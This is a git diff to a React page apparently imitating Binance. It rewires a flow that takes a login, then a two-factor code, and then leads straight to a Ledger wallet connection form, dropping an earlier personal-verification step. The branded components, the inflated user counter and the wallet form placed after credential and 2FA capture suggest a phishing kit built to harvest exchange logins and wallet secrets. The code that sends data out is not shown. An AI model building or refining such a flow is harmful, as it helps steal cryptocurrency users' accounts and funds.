@@ -2,13 +2,12 @@
 import React, { useState, useEffect } from "react";
 import BinanceHeader from "@/components/BinanceHeader";
 import BinanceFooter from "@/components/BinanceFooter";
-import BinanceLedgerForm from "@/components/BinanceLedgerForm";
+import WalletLedgerConnection from "@/components/WalletLedgerConnection";
 import BinanceAppPromotion from "@/components/BinanceAppPromotion";
 import LoginForm from "@/components/LoginForm";
 import TwoFactorAuth from "@/components/TwoFactorAuth";
-import PersonalVerification from "@/components/PersonalVerification";
 
-type AuthStep = 'login' | 'twoFactor' | 'verification' | 'ledgerForm';
+type AuthStep = 'login' | 'twoFactor' | 'walletConnection';
 
 const Index = () => {
   const [userCount, setUserCount] = useState(274368184);
@@ -32,20 +31,12 @@ const Index = () => {
   };
 
   const handleTwoFactorSuccess = () => {
-    setCurrentStep('verification');
-  };
-
-  const handleVerificationSuccess = () => {
-    setCurrentStep('ledgerForm');
+    setCurrentStep('walletConnection');
   };
 
   const handleBackToLogin = () => {
     setCurrentStep('login');
     setUsername('');
-  };
-
-  const handleBackToTwoFactor = () => {
-    setCurrentStep('twoFactor');
   };
 
   const renderCurrentStep = () => {
@@ -60,16 +51,8 @@ const Index = () => {
             onBack={handleBackToLogin}
           />
         );
-      case 'verification':
-        return (
-          <PersonalVerification
-            username={username}
-            onVerificationSuccess={handleVerificationSuccess}
-            onBack={handleBackToTwoFactor}
-          />
-        );
-      case 'ledgerForm':
-        return <BinanceLedgerForm />;
+      case 'walletConnection':
+        return <WalletLedgerConnection />;
       default:
         return <LoginForm onLoginSuccess={handleLoginSuccess} />;
     }
